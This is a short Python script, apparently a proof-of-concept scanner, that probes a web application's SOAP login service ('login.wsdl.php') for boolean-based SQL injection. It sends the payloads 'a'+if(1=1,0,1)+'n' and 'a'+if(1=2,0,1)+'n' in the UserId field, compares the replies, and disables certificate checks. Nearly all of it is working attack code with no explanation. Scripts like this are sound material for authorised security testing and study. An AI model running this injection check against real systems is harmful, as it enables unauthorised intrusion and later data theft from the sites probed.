import requests,re,urllib3
from hashlib import md5
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
a1=randomInt(200, 900)
def substr(strs,s,lens):
	result=strs[s:s+lens]
	return result
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"webservice-json/login/login.wsdl.php"
	headers={
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	"Accept-Encoding": "gzip, deflate",
	"Content-Type": "text/xml"
	}
	body='''<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:LoginServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:GetCurrentInformation soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <UserId xsi:type="xsd:string">a'+if(1=1,0,1)+'n</UserId>
      </urn:GetCurrentInformation>
   </soapenv:Body>
</soapenv:Envelope>
	'''
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	try:
		xsdstring=re.findall('xsd:string">(.+?)</return>',response.text)[0]
		if xsdstring!='[]':
			r1=True
		else:
			r1=False
	except:
		r1=False
	url=baseurl+"webservice-json/login/login.wsdl.php"
	headers={
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	"Accept-Encoding": "gzip, deflate",
	"Content-Type": "text/xml"
	}
	body='''<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:LoginServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:GetCurrentInformation soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <UserId xsi:type="xsd:string">a'+if(1=2,0,1)+'n</UserId>
      </urn:GetCurrentInformation>
   </soapenv:Body>
</soapenv:Envelope>
	'''
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	try:
		xsdstring=re.findall('xsd:string">(.+?)</return>',response.text)[0]
		if xsdstring=='[]':
			r2=True
		else:
			r2=False
	except:
		r2=False
	if r1 and r2:
		return True
	else:
		return False
